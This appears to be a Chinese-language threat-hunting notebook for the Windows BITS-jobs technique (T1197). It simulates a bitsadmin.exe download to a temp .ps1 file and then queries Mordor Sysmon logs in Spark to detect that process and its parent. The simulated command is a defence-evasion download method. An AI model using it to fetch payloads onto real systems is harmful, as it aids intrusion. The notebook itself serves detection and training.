{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.8.5"
    },
    "colab": {
      "name": "01-bitsadmin_download_malicious_file.ipynb",
      "provenance": []
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "IvOUUvaEUYbW"
      },
      "source": [
        "# 使用Bitsadmin绕过下载文件（Bitsadmin Download Malicious File）"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "llWfL6soUYbg"
      },
      "source": [
        "## 概述"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BjDigycyUYbh"
      },
      "source": [
        "| 编写作者 | 攻击矩阵 | 创建时间 | 修改时间 |\n",
        "| ---- | ---- | ---- | ---- |\n",
        "| G4rb3n | T1197 | 2021-4-9 | 2021-4-9 |"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "IOWXh_amUYbi"
      },
      "source": [
        "## 攻击场景"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YXfLI6mcUYbi"
      },
      "source": [
        "黑客通过Bitsadmin绕过检测下载恶意文件。"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "nGHnIBuVUYbj"
      },
      "source": [
        "## 攻击模拟"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "stzReSOTVCBv"
      },
      "source": [
        "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin1_flag.ps1\n",
        "\n",
        "DISPLAY: '/Download' TYPE: DOWNLOAD STATE: TRANSFERRED\n",
        "PRIORITY: FOREGROUND FILES: 1 / 1 BYTES: 6886 / 6886 (100%)\n",
        "Transfer complete."
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2qZCycHZUYbk"
      },
      "source": [
        "## 威胁狩猎"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7kOe50v7UYbk"
      },
      "source": [
        "### 狩猎原理"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "-wfOnrxfUYbk"
      },
      "source": [
        "监控 bitsadmin.exe 进程创建。"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "5-fbQ-W-UYbl"
      },
      "source": [
        "### 初始化分析引擎"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "lUvBTi_YUYbl"
      },
      "source": [
        "from openhunt.mordorutils import *\n",
        "spark = get_spark()"
      ],
      "execution_count": 1,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Gh0g6zOUUYbm"
      },
      "source": [
        "### 下载&加载Mordor日志集"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "0smjIKcWUYbm",
        "outputId": "3ddf6b01-1568-4510-a89b-62454d386e85"
      },
      "source": [
        "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/cmd_bitsadmin_download_psh_script.zip\"\n",
        "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[+] Processing a Spark DataFrame..\n",
            "[+] DataFrame Returned !\n",
            "[+] Temporary SparkSQL View: mordorTable \n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "-a1d0G-hUYbq"
      },
      "source": [
        "### 日志集统计"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "iY41yn-HUYbs",
        "outputId": "10ee5059-ad31-45f8-e599-a85970565b20"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT Hostname, Channel, EventID, Count(*) as count\n",
        "FROM mordorTable\n",
        "GROUP BY Hostname, Channel, EventID\n",
        "ORDER BY count DESC\n",
        "'''\n",
        ")\n",
        "df.show(truncate=False)"
      ],
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+------------+------------------------------------+-------+-----+\n",
            "|Hostname    |Channel                             |EventID|count|\n",
            "+------------+------------------------------------+-------+-----+\n",
            "|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|7      |141  |\n",
            "|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|10     |96   |\n",
            "|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|12     |55   |\n",
            "|WORKSTATION5|Security                            |4658   |16   |\n",
            "|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|13     |15   |\n",
            "|WORKSTATION5|Security                            |5156   |12   |\n",
            "|WORKSTATION5|Security                            |4703   |11   |\n",
            "|WORKSTATION5|Security                            |4656   |11   |\n",
            "|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|3      |8    |\n",
            "|WORKSTATION5|Security                            |4663   |8    |\n",
            "|WORKSTATION5|Security                            |4690   |8    |\n",
            "|WORKSTATION5|Security                            |5158   |6    |\n",
            "|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|11     |6    |\n",
            "|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|9      |4    |\n",
            "|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|22     |3    |\n",
            "|WORKSTATION5|Security                            |4673   |2    |\n",
            "|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|5      |2    |\n",
            "|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|1      |2    |\n",
            "|WORKSTATION5|Security                            |4799   |2    |\n",
            "|WORKSTATION5|Security                            |4689   |2    |\n",
            "+------------+------------------------------------+-------+-----+\n",
            "only showing top 20 rows\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "vWFqCDptUYbt"
      },
      "source": [
        "### 使用规则匹配攻击事件"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "g4JS_Y7tUYbt"
      },
      "source": [
        "### 规则 I"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "DKKduvUbUYbt"
      },
      "source": [
        "| 日志类型 | 日志来源 | 行为场景 | 事件ID |\n",
        "| ---- | ---- | ---- | ---- |\n",
        "| Process | sysmon | 进程创建 | 1 |\n",
        "| Process | security | 进程创建 | 4688 |"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BtVt9z4aUYbt"
      },
      "source": [
        "筛选进程创建的事件。"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qwBDkqczUYbu",
        "outputId": "d99f7b07-36c0-49e8-cdc7-a6784f1fd96c"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT `@timestamp`, EventID, Image\n",
        "FROM mordorTable\n",
        "WHERE Channel = 'Microsoft-Windows-Sysmon/Operational'\n",
        "  AND EventID = 1\n",
        "'''\n",
        ")\n",
        "df.show(10, False)"
      ],
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+------------------------+-------+---------------------------------+\n",
            "|@timestamp              |EventID|Image                            |\n",
            "+------------------------+-------+---------------------------------+\n",
            "|2020-10-23T02:36:43.547Z|1      |C:\\Windows\\System32\\bitsadmin.exe|\n",
            "|2020-10-23T02:36:43.590Z|1      |C:\\Windows\\System32\\svchost.exe  |\n",
            "+------------------------+-------+---------------------------------+\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2__e9PyWUYbu"
      },
      "source": [
        "筛选进程名为bitsadmin.exe的命令行。"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "sFyMFImJUYbu",
        "outputId": "ebed700d-250c-4cff-b9d3-c4f2aa21a39d"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT `@timestamp`, CommandLine\n",
        "FROM mordorTable\n",
        "WHERE Channel = 'Microsoft-Windows-Sysmon/Operational'\n",
        "  AND EventID = 1\n",
        "  AND Image LIKE \"%bitsadmin.exe\"\n",
        "'''\n",
        ")\n",
        "df.show(10, False)"
      ],
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n",
            "|@timestamp              |CommandLine                                                                                                                                                                                               |\n",
            "+------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n",
            "|2020-10-23T02:36:43.547Z|bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\wardog\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1|\n",
            "+------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "qQdYUoVFUYbv"
      },
      "source": [
        "筛选bitsadmin的父进程名及父进程命令行。"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "F06uPOA_UYbv",
        "outputId": "6b05396b-9f62-494f-8188-fd71eb37e57c"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT `@timestamp`, ParentImage, ParentCommandLine\n",
        "FROM mordorTable\n",
        "WHERE Channel = 'Microsoft-Windows-Sysmon/Operational'\n",
        "  AND EventID = 1\n",
        "  AND Image LIKE \"%bitsadmin.exe\"\n",
        "'''\n",
        ")\n",
        "df.show(10, False)"
      ],
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+------------------------+---------------------------+------------------------------+\n",
            "|@timestamp              |ParentImage                |ParentCommandLine             |\n",
            "+------------------------+---------------------------+------------------------------+\n",
            "|2020-10-23T02:36:43.547Z|C:\\Windows\\System32\\cmd.exe|\"C:\\windows\\system32\\cmd.exe\" |\n",
            "+------------------------+---------------------------+------------------------------+\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    }
  ]
}